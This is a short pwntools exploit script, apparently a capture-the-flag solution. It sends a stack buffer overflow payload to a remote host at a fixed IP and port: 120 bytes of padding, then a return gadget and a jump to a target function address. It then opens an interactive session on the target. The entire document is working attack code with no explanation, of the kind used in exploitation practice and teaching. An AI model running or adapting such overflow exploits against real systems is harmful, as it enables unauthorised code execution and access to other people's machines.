from pwn import *

elf = context.binary = ELF("./chall")
context.log_level='debug'

# p = process()
p = remote("103.185.44.122", 19000)

payload = b'a'*120
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401216)

p.sendline(payload)
p.interactive()